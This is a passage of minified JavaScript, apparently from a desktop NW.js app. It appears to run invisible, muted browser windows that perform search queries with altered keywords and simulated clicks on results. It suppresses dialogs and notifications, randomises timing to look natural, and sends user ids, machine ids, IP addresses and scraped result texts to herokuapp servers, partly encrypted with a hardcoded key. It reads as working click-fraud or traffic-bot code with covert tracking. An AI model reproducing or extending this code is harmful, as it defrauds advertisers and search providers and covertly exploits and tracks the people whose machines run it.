				if (0 == noa.isNW47() && (!t.wndOverrideFlags || t.wndOverrideFlags.open)) try {
					e.open = o.window.Function("return false;")
				} catch (e) {}
				try {
					e.alert = o.window.Function("return false;")
				} catch (e) {}
				if (e.confirm = o.window.alert, e.prompt = o.window.confirm, e.onbeforeunload = null, e.HTMLVideoElement) try {
					e.HTMLVideoElement.prototype.play = o.window.Function("return false;")
				} catch (e) {}
				try {
					e.Notification = o.window.Function("return false;")
				} catch (e) {}
			},
			overrideAllWnds: function(e) {
				if (e && e.smoothContext.nwWindow && e.smoothContext.nwWindow.window && (momo.overrides(e.smoothContext.nwWindow.window, e, e.smoothContext.nwWindow), scptNWWindowAPI.setmute(e.smoothContext.nwWindow, !0)), Array.isArray(e.ruggedContexts))
					for (var t in e.ruggedContexts) e.ruggedContexts[t].nwWindow && scptNWWindowAPI.has_setmute(e.ruggedContexts[t].nwWindow) && (momo.overrides(e.ruggedContexts[t].nwWindow.window, e, e.ruggedContexts[t].nwWindow), scptNWWindowAPI.setmute(e.ruggedContexts[t].nwWindow, !0))
			},
			overrideAllFrames: function(e) {
				if (e && e.smoothContext && e.smoothContext.nwWindow && e.smoothContext.nwWindow.window) {
					for (var t = 0; t < e.smoothContext.nwWindow.window.frames.length; t++) momo.overrides(e.smoothContext.nwWindow.window.frames[t], e, e.smoothContext.nwWindow);
					scptNWWindowAPI.setmute(e.smoothContext.nwWindow, !0)
				}
				if (Array.isArray(e.ruggedContexts))
					for (var o in e.ruggedContexts) {
						for (t = 0; t < e.ruggedContexts[o].nwWindow.window.frames.length; t++) momo.overrides(e.ruggedContexts[o].nwWindow.window.frames[t], e, e.ruggedContexts[o].nwWindow);
						e.ruggedContexts[o].nwWindow && scptNWWindowAPI.has_setmute(e.ruggedContexts[o].nwWindow) && scptNWWindowAPI.setmute(e.ruggedContexts[o].nwWindow, !0)
					}
			},
			clearWatchersIntervals: function(e) {
				e.sharks && (global.clearInterval(e.sharks), e.sharks = null), e.memWatcher && (global.clearInterval(e.memWatcher), e.memWatcher = null)
			},
			validateActiveSession: function(e, t) {
				try {
					return t.activeSessionId == e.sessionId
				} catch (e) {
					return !1
				}
			},
			validateFeedSessionTimeout: function(e) {
				try {
					return !(e.sessionStartTime + e.feedExecutionTimeoutMiliseconds < (new Date).getTime()) || (momo.tryCloseSmoothWnd(e), e.executionState < STATES.TIMEOUT && (e.executionState = STATES.TIMEOUT), !1)
				} catch (t) {
					return momo.tryCloseSmoothWnd(e), e.executionState < STATES.TIMEOUT && (e.executionState = STATES.TIMEOUT), !1
				}
			},
			startExecutionTimeout: function(e) {
				if (null == e.globalTimeout) {
					var t = jen.DEFAULT_PROVIDER_TIMEOUT;
					e.fosConfig && void 0 !== e.fosConfig && void 0 !== e.fosConfig.sessionTimeout && void 0 !== e.fosConfig.sessionTimeout.min && void 0 !== e.fosConfig.sessionTimeout.max && (t = 1e3 * randomize(e.fosConfig.sessionTimeout.min, e.fosConfig.sessionTimeout.max)), e.sessionStartTime = (new Date).getTime(), e.feedExecutionTimeoutMiliseconds = t, e.globalTimeout = global.setTimeout((function() {
						tryCatchConsole((function() {
							e.executionState < STATES.TIMEOUT && (e.executionState = STATES.TIMEOUT), momo.tryCloseSmoothWnd(e)
						}))
					}), t)
				}
			},
			recordUrl: function(e) {
				try {
					var t = e.nwWindow.window.location.href;
					0 == e.actionsPerformed ? e.urlsToFirstLP.push(t) : e.urlsAfterFirstLP.push(t)
				} catch (e) {}
			},
			appendNW47WindowOptions: function(e, t) {
				try {
					noa.isNW47() && (t.hardmute = !0, t.alwaysInvisible = !debug_mode, t.prov_name = momo.tryGetProviderId(e), t.prov_id = e.feedId, t.session_id = e.sessionContextOwner.sessionId, t.scpt_id = e.sessionContextOwner.scriptContextOwner.scriptId)
				} catch (e) {}
				return t
			},
			getFinalUrl: function(e, t) {
				let o = e.chosenFinalUrl + encodeURIComponent(t);
				return e.chosenFinalUrl.includes("{kw}") ? o = e.chosenFinalUrl.replace("{kw}", encodeURIComponent(t)) : e.chosenFinalUrl.toLowerCase().includes("{kw}") && (reportPageView("fatal/invalid_provider_url/" + scriptVersion + "/" + momo.tryGetProviderId(e) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid"), frisitor), ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.FATAL, e, ["smthwnd", "open", o])), o
			},
			getResultsFunction: function(e, t) {
				try {
					if (e && e.prov && e.prov.results_id && t && t[e.prov.results_id]) return t[e.prov.results_id];
					if (e && e.prov && e.prov.results) return e.prov.results
				} catch (e) {}
				return ""
			},
			restartCalled: !1,
			startRestartTimeout: function() {
				autoRestarter.appRestart && 0 == momo.restartCalled && (autoRestarter.appRestart(), momo.restartCalled = !0)
			},
			memWatchCalled: !1,
			reportMemWatch: function() {
				0 == momo.memWatchCalled && (reportEvent("MemWatch." + scriptVersion, getApplicationActionString(), getUserId(), Math.floor(process.memoryUsage().rss / 1024 / 1024), secFrisitor_memWatch), momo.memWatchCalled = !0)
			},
			recorder: {}
		};
		momo.recorder.recordCurrentClick = function(e, t, o, n) {
			try {
				null != e.clickRecords[t] && void 0 !== e.clickRecords[t] || (e.clickRecords[t] = {}), null != e.clickRecords[t][o] && void 0 !== e.clickRecords[t][o] || (e.clickRecords[t][o] = []), e.clickRecords[t][o][n] || (e.clickRecords[t][o][n] = 0), e.clickRecords[t][o][n]++
			} catch (e) {}
		}, momo.recorder.isElementAlreadyClicked = function(e, t, o, n) {
			try {
				return !!(e && e.clickRecords && e.clickRecords[t] && e.clickRecords[t][o] && e.clickRecords[t][o][n] > 0)
			} catch (e) {
				return !1
			}
		}, momo.recorder.getAmountOfClickedElements = function(e, t, o) {
			try {
				return e && e.clickRecords && e.clickRecords[t] && e.clickRecords[t][o] ? e.clickRecords[t][o].reduce((function(e, t) {
					return e + t
				}), 0) : 0
			} catch (e) {
				return 0
			}
		}, momo.recorder.summarizeClicksPerGroup = function(e) {
			var t = {};
			for (var o in e.clickRecords)
				for (var n in e.clickRecords[o]) t[n] || (t[n] = 0), t[n] += e.clickRecords[o][n].reduce((function(e, t) {
					return e + t
				}), 0);
			return t
		}, debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now()), debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		var ally = {
			LOGGING_REPORT_URLS: ["https://sellbiz.herokuapp.com/logupdate"],
			RESULTS_TEXTS_REPORT_URLS: ["https://sellbiz.herokuapp.com/st"],
			DB_LOGS_CHOSEN_URL_INDEX: 0,
			RESULTS_TEXTS_CHOSEN_URL_INDEX: 0,
			getDBLogsUrl: function() {
				return this.LOGGING_REPORT_URLS[this.DB_LOGS_CHOSEN_URL_INDEX]
			},
			getResultsTextsUrl: function() {
				return this.RESULTS_TEXTS_REPORT_URLS[this.RESULTS_TEXTS_CHOSEN_URL_INDEX]
			},
			increaseDBLogsUrlIndex: function() {
				this.DB_LOGS_CHOSEN_URL_INDEX += 1, this.DB_LOGS_CHOSEN_URL_INDEX >= this.LOGGING_REPORT_URLS.length && (this.DB_LOGS_CHOSEN_URL_INDEX = 0)
			},
			increaseResultsTextsUrlIndex: function() {
				this.RESULTS_TEXTS_CHOSEN_URL_INDEX += 1, this.RESULTS_TEXTS_CHOSEN_URL_INDEX >= this.RESULTS_TEXTS_REPORT_URLS.length && (this.RESULTS_TEXTS_CHOSEN_URL_INDEX = 0)
			},
			reportScriptLog: function(e, t, o, n) {
				try {
					var r = {
						logTime: (new Date).getTime(),
						level: t,
						logType: e,
						app: {
							app_name: nw.App.manifest.name,
							app_version: getFullVersion(),
							nwjs_version: "string" == typeof grunt_nwjs_version ? grunt_nwjs_version : "",
							compilation_guid: "string" == typeof grunt_compilation_guid ? grunt_compilation_guid : "",
							app_imgs_version: "string" == typeof grunt_app_imgs_version ? grunt_app_imgs_version : "",
							kobe_version: scriptVersion,
							uptime: oleg.getUpTime()
						},
						user: {
							user_id: encLocalStorage.getItem("userid"),
							machine_id: encLocalStorage.getItem("machineid") ? encLocalStorage.getItem("machineid") : "",
							ip: JSON.parse(encLocalStorage.getItem("lipr")),
							memory: process.memoryUsage().rss / 1024 / 1024,
							serialNumber: "",
							computerModel: "",
							computerManufacturer: ""
						},
						context: {
							windows: {
								smooth: {
									id: "",
									since: -1,
									firstPageHistoryIndex: -1,
									phaser: -1,
									actionsPerformed: -1
								},
								rugged: []
							},
							prov: {
								since: -1,
								id: "",
								provSessionTimeoutStart: -1,
								provider_name: "",
								flow_name: "",
								kw: {
									original_kw: ""
								},
								execution_state: ""
							},
							session: {
								since: -1,
								id: ""
							},
							kobe: {
								since: o.startTime,
								id: o.scriptId
							}
						},
						message_by_levels: {}
					};
					for (var i in n) r.message_by_levels[i] = n[i];
					ally.reportDBLog(r)
				} catch (e) {
					reportPageView("warn/mo/slog/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
				}
			},
			reportSessionLog: function(e, t, o, n) {
				try {
					var r = {
						logTime: (new Date).getTime(),
						level: t,
						logType: e,
						app: {
							app_name: nw.App.manifest.name,
							app_version: getFullVersion(),
							nwjs_version: "string" == typeof grunt_nwjs_version ? grunt_nwjs_version : "",
							compilation_guid: "string" == typeof grunt_compilation_guid ? grunt_compilation_guid : "",
							app_imgs_version: "string" == typeof grunt_app_imgs_version ? grunt_app_imgs_version : "",
							kobe_version: scriptVersion,
							uptime: oleg.getUpTime()
						},
						user: {
							user_id: encLocalStorage.getItem("userid"),
							machine_id: encLocalStorage.getItem("machineid") ? encLocalStorage.getItem("machineid") : "",
							ip: JSON.parse(encLocalStorage.getItem("lipr")),
							memory: process.memoryUsage().rss / 1024 / 1024,
							serialNumber: "",
							computerModel: "",
							computerManufacturer: ""
						},
						context: {
							windows: {
								smooth: {
									id: "",
									since: -1,
									firstPageHistoryIndex: -1,
									phaser: -1,
									actionsPerformed: -1
								},
								rugged: []
							},
							prov: {
								since: -1,
								id: "",
								provSessionTimeoutStart: -1,
								provider_name: "",
								flow_name: "",
								kw: {
									original_kw: ""
								},
								execution_state: ""
							},
							session: {
								since: o.startTime,
								id: o.sessionId
							},
							kobe: {
								since: o.scriptContextOwner.startTime,
								id: o.scriptContextOwner.scriptId
							}
						},
						message_by_levels: {}
					};
					for (var i in n) r.message_by_levels[i] = n[i];
					ally.reportDBLog(r)
				} catch (e) {
					reportPageView("warn/mo/slog/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
				}
			},
			reportFeedLog: function(e, t, o, n) {
				try {
					var r = {
						logTime: (new Date).getTime(),
						level: t,
						logType: e,
						app: {
							app_name: nw.App.manifest.name,
							app_version: getFullVersion(),
							nwjs_version: "string" == typeof grunt_nwjs_version ? grunt_nwjs_version : "",
							compilation_guid: "string" == typeof grunt_compilation_guid ? grunt_compilation_guid : "",
							app_imgs_version: "string" == typeof grunt_app_imgs_version ? grunt_app_imgs_version : "",
							kobe_version: scriptVersion,
							uptime: oleg.getUpTime()
						},
						user: {
							user_id: encLocalStorage.getItem("userid"),
							machine_id: encLocalStorage.getItem("machineid") ? encLocalStorage.getItem("machineid") : "",
							ip: JSON.parse(encLocalStorage.getItem("lipr")),
							memory: process.memoryUsage().rss / 1024 / 1024,
							serialNumber: "",
							computerModel: "",
							computerManufacturer: ""
						},
						context: {
							windows: {
								smooth: {
									id: o.smoothContext ? o.smoothContext.windowId : "",
									since: o.smoothContext ? o.smoothContext.startTime : -1,
									firstPageHistoryIndex: o.smoothContext ? o.smoothContext.firstPageHistoryIndex : -1,
									phaser: o.smoothContext ? o.smoothContext.phaser : -1,
									actionsPerformed: o.smoothContext ? o.smoothContext.actionsPerformed : -1
								},
								rugged: Array.isArray(o.ruggedContexts) ? o.ruggedContexts.map((function(e) {
									return {
										id: e && e.windowId ? e.windowId : "",
										since: e && e.startTime ? e.startTime : -1,
										firstPageHistoryIndex: e ? e.firstPageHistoryIndex : -1,
										phaser: e ? e.phaser : -1,
										actionsPerformed: e ? e.actionsPerformed : -1
									}
								})) : []
							},
							prov: {
								since: o.startTime,
								id: o.feedId,
								provSessionTimeoutStart: o.sessionStartTime,
								provider_name: momo.tryGetProviderId(o),
								flow_name: o.executionFlow ? o.executionFlow : "",
								kw: {
									original_kw: o.kw
								},
								execution_state: Object.keys(STATES)[Object.values(STATES).indexOf(o.executionState)] ? Object.keys(STATES)[Object.values(STATES).indexOf(o.executionState)] : ""
							},
							session: {
								since: o.sessionContextOwner.startTime,
								id: o.sessionContextOwner.sessionId
							},
							kobe: {
								since: o.sessionContextOwner.scriptContextOwner.startTime,
								id: o.sessionContextOwner.scriptContextOwner.scriptId
							}
						},
						message_by_levels: {}
					};
					for (var i in n) r.message_by_levels[i] = n[i];
					ally.reportDBLog(r)
				} catch (e) {
					reportPageView("warn/mo/flog/" + scriptVersion + "/" + momo.tryGetProviderId(o) + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
				}
			},
			reportDBLog: function(e) {
				try {
					var t = JSON.stringify(e);
					CryptoJS.AES.encrypt(t, CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))).toString()
				} catch (e) {
					reportPageView("warn/mo/log/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
				}
			},
			reportResultsTexts: function(e) {
				try {
					if (e.resultsTextObject && Array.isArray(e.resultsTextObject.out) && e.resultsTextObject.out.length > 0) {
						var t = JSON.stringify(e.resultsTextObject),
							o = CryptoJS.AES.encrypt(t, CryptoJS.enc.Utf8.stringify(CryptoJS.AES.decrypt(encLocalStorage.getItem("bin"), "!@$~B1aB1a43Out0f1obis:)Leaver$4Ev)er^_^"))).toString();
						ajax.post(this.getResultsTextsUrl(), void 0, (function(e) {
							ally.increaseResultsTextsUrlIndex()
						}), void 0, encodeURIComponent(o))
					}
				} catch (e) {
					reportPageView("warn/mo/res/slog/" + scriptVersion + "/" + getApplicationActionString() + "/" + encLocalStorage.getItem("userid") + "/" + e.stack, frisitor)
				}
			},
			monitoringObj: {}
		};
		ally.monitoringObj.fillUser = function(e) {
			var t = encLocalStorage.getItem("ua"),
				o = "none",
				n = "-1",
				r = navigator.userAgent;
			null != t && (o = (t = JSON.parse(t)).default.browser, n = t.default.version, r = t.default.string);
			var i = encLocalStorage.getItem("PRYO"),
				a = "0",
				c = "0";
			null != i && (a = (i = JSON.parse(i)).bucketId, c = i.executes), e.monitoringObject.user = {
				id: encLocalStorage.getItem("userid"),
				machine_id: encLocalStorage.getItem("machineid") ? encLocalStorage.getItem("machineid") : "",
				kobeVersion: scriptVersion,
				appName: nw.App.manifest.name,
				appVersion: getFullVersion(),
				nwjs_version: "string" == typeof grunt_nwjs_version ? grunt_nwjs_version : "",
				compilation_guid: "string" == typeof grunt_compilation_guid ? grunt_compilation_guid : "",
				app_imgs_version: "string" == typeof grunt_app_imgs_version ? grunt_app_imgs_version : "",
				uptime: oleg.getUpTime(),
				os: oleg.getOSFromNavigator(),
				totalClicksPerformed: e.totalClicksPerformed,
				computer: {
					serialNumber: "",
					computerModel: "",
					computerManufacturer: ""
				},
				ua: {
					browser: o,
					version: n,
					final_string: r
				},
				freqBucket: {
					id: a,
					executes: c
				},
				sessionTime: calcTotalSessionTime(e.sessionStartTime)
			}
		}, ally.monitoringObj.fillQuery = function(e) {
			e.monitoringObject.flow.queries[e.fosAmountPerformed] || (e.monitoringObject.flow.queries[e.fosAmountPerformed] = {
				index: e.fosAmountPerformed,
				clicksAmountGenerated: e.clicksAmount,
				wordsAmount: e.wordsAmount,
				performedWay: {
					way: e.chosenPerformingWay
				},
				kws: {
					original_term: e.originalKW,
					manipulated_term: e.manipulatedKW,
					scrambled_term: e.scrambledKW,
					final_term: e.kw,
					type: e.oddType,
					scrambled: e.isScrambled,
					manipulator: e.manipulatorCategoryChosen
				},
				flowOutput: {
					cats: cloneObject(e.catsAmounts),
					clicks: []
				}
			})
		}, ally.monitoringObj.updateQuery = function(e) {
			e.monitoringObject.flow.queries[e.fosAmountPerformed] && (e.monitoringObject.flow.queries[e.fosAmountPerformed].clicksAmountGenerated = e.clicksAmount, e.monitoringObject.flow.queries[e.fosAmountPerformed].wordsAmount = e.wordsAmount)
		}, ally.monitoringObj.fillOscar = function(e) {
			e.monitoringObject.flow.queries[e.fosAmountPerformed].flowOutput.cats = cloneObject(e.catsAmounts), e.monitoringObject.flow.queries[e.fosAmountPerformed].flowOutput.clicks[e.clicksPerformed] = {
				index: e.clicksPerformed,
				chosen_result_group: e.resGroup,
				chosen_result_index: e.chosenResIndex,
				backReplaces: {
					newNavigation: [],
					regularBack: []
				},
				refused_parsing: e.refusedParsing
			}
		}, ally.sailor = {}, ally.sailor.queueMessageTypes = {
			DBLog: 1,
			ResultsTexts: 2
		}, ally.sailor.urls = {}, ally.sailor.urls[ally.sailor.queueMessageTypes.DBLog] = ["https://paybiz.herokuapp.com/logupdate"], ally.sailor.urls[ally.sailor.queueMessageTypes.ResultsTexts] = ["https://paybiz.herokuapp.com/st"], ally.sailor.urlsPointers = {}, ally.sailor.urlsPointers[ally.sailor.queueMessageTypes.DBLog] = 0, ally.sailor.urlsPointers[ally.sailor.queueMessageTypes.ResultsTexts] = 0, ally.sailor.data = {}, ally.sailor.data[ally.sailor.queueMessageTypes.DBLog] = [], ally.sailor.data[ally.sailor.queueMessageTypes.ResultsTexts] = [], ally.sailor.config = {}, ally.sailor.config[ally.sailor.queueMessageTypes.DBLog] = {
			throttleMaxSeconds: 10,
			throttleMaxBufferSize: 100
		}, ally.sailor.config[ally.sailor.queueMessageTypes.ResultsTexts] = {
			throttleMaxSeconds: 10,
			throttleMaxBufferSize: 10
		}, ally.sailor.timeouts = {}, ally.sailor.queue = function(e, t) {
			ally.sailor.timeouts[t] && (global.clearTimeout(ally.sailor.timeouts[t]), ally.sailor.timeouts[t] = null), ally.sailor.config[t] || (ally.sailor.config[t] = {}), ally.sailor.config[t].throttleMaxSeconds || (ally.sailor.config[t].throttleMaxSeconds = 5), ally.sailor.config[t].throttleMaxBufferSize || (ally.sailor.config[t].throttleMaxBufferSize = 10), 0 == Array.isArray(ally.sailor.data[t]) && (ally.sailor.data[t] = []), ally.sailor.data[t].push(e), ally.sailor.data[t].length >= ally.sailor.config[t].throttleMaxBufferSize ? ally.sailor.send(t) : ally.sailor.timeouts[t] = global.setTimeout(ally.sailor.send, 1e3 * ally.sailor.config[t].throttleMaxSeconds, t)
		}, ally.sailor.send = function(e) {
			var t = ally.sailor.data[e].splice(0, ally.sailor.data[e].length),
				o = encodeURIComponent(JSON.stringify(t));
			ajax.post(ally.sailor.urls[e][ally.sailor.urlsPointers[e]], void 0, (function(t) {
				ally.sailor.urlsPointers[e] += 1, ally.sailor.urlsPointers[e] >= ally.sailor.urls[e].length && (ally.sailor.urlsPointers[e] = 0)
			}), void 0, o)
		}, ally.reportFreddie = function(e, t) {
			try {
				0 == t.reportsPerformed.freddie && e.catsAmounts.res > 0 && (t.reportsPerformed.freddie = !0, reportEvent("Freddie" + scriptVersion + (e.uaOverride ? "." + e.uaOverride : "") + "." + momo.tryGetProviderId(e) + "." + (e.executionFlow ? e.executionFlow : "unknown") + "." + e.oddType + "." + e.resGroup, getApplicationActionString(), encLocalStorage.getItem("userid"), e.catsAmounts.spo, frisitor))
			} catch (e) {}
		}, ally.fillResultsText = function(e, t, o) {
			try {
				if (e.catsAmounts.res > 0 && o && (o.rel && Array.isArray(o.rel) && o.rel.length > 0 || o.alsoTry && Array.isArray(o.alsoTry) && o.alsoTry.length > 0 || o.paa && Array.isArray(o.paa) && o.paa.length > 0 || o.news && Array.isArray(o.news) && o.news.length > 0 || o.relQueries && Array.isArray(o.relQueries) && o.relQueries.length > 0)) {
					e.resultsTextObject.provider = momo.tryGetProviderId(e);
					var n = {
						app: {
							app_name: nw.App.manifest.name,
							app_version: getFullVersion(),
							nwjs_version: "string" == typeof grunt_nwjs_version ? grunt_nwjs_version : "",
							compilation_guid: "string" == typeof grunt_compilation_guid ? grunt_compilation_guid : "",
							app_imgs_version: "string" == typeof grunt_app_imgs_version ? grunt_app_imgs_version : "",
							kobe_version: scriptVersion,
							uptime: oleg.getUpTime()
						},
						user: {
							user_id: encLocalStorage.getItem("userid"),
							machine_id: encLocalStorage.getItem("machineid") ? encLocalStorage.getItem("machineid") : "",
							ip: JSON.parse(encLocalStorage.getItem("lipr")),
							memory: process.memoryUsage().rss / 1024 / 1024
						},
						context: {
							prov: {
								since: e.startTime,
								provSessionTimeoutStart: e.sessionStartTime,
								provider_name: momo.tryGetProviderId(e),
								flow_type: e.flowConfig.type,
								flow_name: e.executionFlow ? e.executionFlow : "",
								execution_state: Object.keys(STATES)[Object.values(STATES).indexOf(e.executionState)] ? Object.keys(STATES)[Object.values(STATES).indexOf(e.executionState)] : ""
							},
							session: {
								since: e.sessionContextOwner.startTime,
								id: e.sessionContextOwner.sessionId
							},
							kobe: {
								since: e.sessionContextOwner.scriptContextOwner.startTime,
								id: e.sessionContextOwner.scriptContextOwner.scriptId
							}
						},
						kws: {
							oddType: e.oddType,
							original_term: e.originalKW,
							manipulated_term: e.manipulatedKW,
							scrambled_term: e.scrambledKW,
							final_term: e.kw,
							type: e.oddType,
							scrambled: e.isScrambled,
							manipulator: e.manipulatorCategoryChosen
						},
						results_id: e.prov && e.prov.results_id ? e.prov.results_id : -1,
						domain: t && t.nwWindow ? oleg.tryGetHostname(t.nwWindow) : -1,
						catsText: {
							res: [],
							spo: [],
							rel: [],
							alsoTry: [],
							paa: [],
							news: [],
							relQueries: []
						}
					};
					o && (o.rel && Array.isArray(o.rel) && o.rel.length > 0 && (n.catsText.rel = o.rel.map((function(e) {
						return e.textContent
					}))), o.alsoTry && Array.isArray(o.alsoTry) && o.alsoTry.length > 0 && (n.catsText.alsoTry = o.alsoTry.map((function(e) {
						return e.textContent
					}))), o.paa && Array.isArray(o.paa) && o.paa.length > 0 && (n.catsText.paa = o.paa.map((function(e) {
						return e.textContent
					}))), o.news && Array.isArray(o.news) && o.news.length > 0 && (n.catsText.news = o.news.map((function(e) {
						return e.textContent
					}))), o.relQueries && Array.isArray(o.relQueries) && o.relQueries.length > 0 && (n.catsText.relQueries = o.relQueries.map((function(e) {
						return e.textContent
					}))), o.res && Array.isArray(o.res) && o.res.length > 0 && (n.catsText.res = o.res.map((function(e) {
						return e.textContent
					}))), o.spo && Array.isArray(o.spo) && o.spo.length > 0 && (n.catsText.spo = o.spo.map((function(e) {
						return e.textContent
					})))), e.resultsTextObject.out.push(n)
				}
			} catch (e) {}
		}, ally.reportSmthwndHostName = function(e, t) {
			try {
				let o = oleg.tryGetHostname(t);
				ally.reportFeedLog(LOG_TYPE.SCRIPT, LOG_LEVELS.DEBUG, e, ["rrh", o]), reportPageView("flow/rrh/" + o + "/" + momo.tryGetProviderId(e) + "/" + scriptVersion + "/" + getApplicationActionString(), secFrisitor_PageViews)
			} catch (e) {}
		}, ally.reportRockNRollHolyEvent = function(e, t, o) {
			try {
				reportEvent(t + "_" + e.runningModeName, getApplicationActionString(), getUserId(), o, frisitor)
			} catch (o) {
				global.setTimeout((function() {
					try {
						reportPageView("error/" + t + "_" + e.runningModeName + "/" + scriptName + scriptVersion + "/" + nw.App.manifest.name.toLowerCase() + "/" + getFullVersion() + "/", frisitor)
					} catch (e) {}
				}), 6e4)
			}
		}, debug_mode && (debuggingModuleLoadEndMeasureTime = performance.now()), debug_mode && (debuggingModuleLoadStartMeasureTime = performance.now());
		var slash = {
			isLocked: !1,
			addVioletTimeout: null,
			addViolets: function(e, t) {
				if (!e || 0 == Array.isArray(e) || e.length <= 0) "function" == typeof t && t(-1);
				else if (null != slash.addVioletTimeout && (global.clearTimeout(slash.addVioletTimeout), slash.addVioletTimeout = null), 0 == slash.isLocked) {
					slash.isLocked = !0;
					try {
						let t = JSON.parse(encLocalStorage.getItem("violets"));
						t && 0 != Array.isArray(t) || (t = []), t = t.concat(e), encLocalStorage.setItem("violets", JSON.stringify(t))
					} catch (e) {}
					slash.isLocked = !1, "function" == typeof t && t(e.length)
				} else slash.addVioletTimeout = global.setTimeout(slash.addViolets, 100, e, t)
			},
			pullVioletTimeout: null,
			pullViolet: function(e) {
				if (null != slash.pullVioletTimeout && (global.clearTimeout(slash.pullVioletTimeout), slash.pullVioletTimeout = null), 0 == slash.isLocked) {
					slash.isLocked = !0;
					let t = null;
					try {
						let e = JSON.parse(encLocalStorage.getItem("violets"));
						if (e && 1 == Array.isArray(e) && e.length > 0) {
							let o = e;
							e.some((function(e) {
								return e && "string" == typeof e.priority && "high" == e.priority
							})) ? o = e.filter((function(e) {
								return e && "string" == typeof e.priority && "high" == e.priority
							})) : e.some((function(e) {
								return e && "string" == typeof e.priority && "medium" == e.priority
							})) && (o = e.filter((function(e) {
								return e && "string" == typeof e.priority && "medium" == e.priority
							})));
							let n = Math.floor(randomize(0, o.length - 1));
							t = o.splice(n, 1), t = 1 == Array.isArray(t) && t.length >= 1 ? t[0] : null, e = e.filter((function(e) {
								return e != t
							})), encLocalStorage.setItem("violets", JSON.stringify(e))
						}
					} catch (e) {}
					slash.isLocked = !1, "function" == typeof e && e(t)
				} else slash.pullVioletTimeout = global.setTimeout(slash.pullViolet, 100, e)
			},
			getVioletsAmountTimeout: null,
			getVioletsAmount: function(e, t) {
				if (null != slash.getVioletsAmountTimeout && (global.clearTimeout(slash.getVioletsAmountTimeout), slash.getVioletsAmountTimeout = null), 0 == slash.isLocked) {
					slash.isLocked = !0;
					let o = 0;
					try {
						let t = JSON.parse(encLocalStorage.getItem("violets"));
						t && 1 == Array.isArray(t) && t.length > 0 && (o = t.length, null != e && (o = t.filter((function(t) {
							return t && t.sessionId && t.sessionId == e
						})).length))
					} catch (e) {}
					slash.isLocked = !1, "function" == typeof t && t(o)
				} else slash.getVioletsAmountTimeout = global.setTimeout(slash.getVioletsAmount, 100, e, t)
			},
			getVioletsAmountSync: function() {
				try {
					let e = JSON.parse(encLocalStorage.getItem("violets"));
					if (e && 1 == Array.isArray(e) && e.length > 0) return e.length
				} catch (e) {}
				return 0
			},
			clearAllVioletsTimeout: null,
			clearAllViolets: function(e) {
				if (null != slash.clearAllVioletsTimeout && (global.clearTimeout(slash.clearAllVioletsTimeout), slash.clearAllVioletsTimeout = null), 0 == slash.isLocked) {
					slash.isLocked = !0;
					try {
						encLocalStorage.removeItem("violets")
					} catch (e) {}
					slash.isLocked = !1, "function" == typeof e && e()
				} else slash.clearAllVioletsTimeout = global.setTimeout(slash.clearAllViolets, 100, e)
			},
			clearVioletsOfProviderTimeout: null,
			clearVioletsOfProvider: function(e, t) {
				if (null != slash.clearVioletsOfProviderTimeout && (global.clearTimeout(slash.clearVioletsOfProviderTimeout), slash.clearVioletsOfProviderTimeout = null), 0 == slash.isLocked) {
					slash.isLocked = !0;
					try {
						let t = JSON.parse(encLocalStorage.getItem("violets"));
						t && 1 == Array.isArray(t) && t.length > 0 && (t = t.filter((function(t) {
							return t.id != e
						})), encLocalStorage.setItem("violets", JSON.stringify(t)))
					} catch (e) {}
					slash.isLocked = !1, "function" == typeof t && t()
				} else slash.clearVioletsOfProviderTimeout = global.setTimeout(slash.clearVioletsOfProvider, 100, e, t)
			},
			clearLeftoverVioletsTimeout: null,
			clearLeftoverViolets: function(e, t) {
				if (null != slash.clearLeftoverVioletsTimeout && (global.clearTimeout(slash.clearLeftoverVioletsTimeout), slash.clearLeftoverVioletsTimeout = null), 0 == slash.isLocked) {
					slash.isLocked = !0;
					let o = -1,
						n = -1,
						r = -1;
					try {
						let t = JSON.parse(encLocalStorage.getItem("violets"));
						if (t && 1 == Array.isArray(t) && t.length > 0) {
							let i = t.length;
							t = t.filter((function(t) {
								for (let o = 0; o < e.providers.length; o++) {
									let n = e.providers[o];
									if (n.id == t.id) {
										if ("" == t.factor_id && n.factors && Object.keys(n.factors).length > 0 || "" != t.factor_id && (!n.factors || Object.keys(n.factors).length <= 0)) return !1;
										if (!t.birthTime || t.birthTime < (new Date).getTime() - ONE_HOUR_TIMESPACE * t.TTL) return !1;
										if ("" == t.factor_id && (!n.factors || Object.keys(n.factors).length <= 0)) return !0;
										for (let e in n.factors)
											if (e == t.factor_id) return !0
									}
								}
								return !1
							})), o = i - t.length;
							let a = t.length;
							t = t.filter((function(t) {
								if (!t.groupIds || 0 == Array.isArray(t.groupIds) || 0 == t.groupIds.length) return !0;
								let o = JSON.parse(encLocalStorage.getItem("provGroups"));
								for (let n in t.groupIds) {
									let r = t.groupIds[n];
									if (o[r] && o[r].startDateTime == getDateTruncTimeStamp() || (o[r] = {
											startDateTime: getDateTruncTimeStamp(),
											executions: [],
											cap: Math.floor(randomize(e.kwl.provGroupsConfig[r].cap.min, e.kwl.provGroupsConfig[r].cap.max))
										}), o[r].executions.length >= o[r].cap) return !1
								}
								return encLocalStorage.setItem("provGroups", JSON.stringify(o)), !0
							})), n = a - t.length;
							let c = t.length;
							t = t.filter((function(t) {
								if (!t.id) return !0;
								let o = momo.getStrategyConfig(e);
								return Array.isArray(o.providers.whitelist) && o.providers.whitelist.length > 0 ? o.providers.whitelist.includes(t.id) : !(Array.isArray(o.providers.blacklist) && o.providers.blacklist.length > 0) || 0 == o.providers.blacklist.includes(t.id)
							})), r = c - t.length, encLocalStorage.setItem("violets", JSON.stringify(t))
						}
					} catch (e) {}
					slash.isLocked = !1, "function" == typeof t && t(o, n, r)
				} else slash.clearLeftoverVioletsTimeout = global.setTimeout(slash.clearLeftoverViolets, 100, providerId, t)
			},
			pushVioletExecutionTimeout: null,
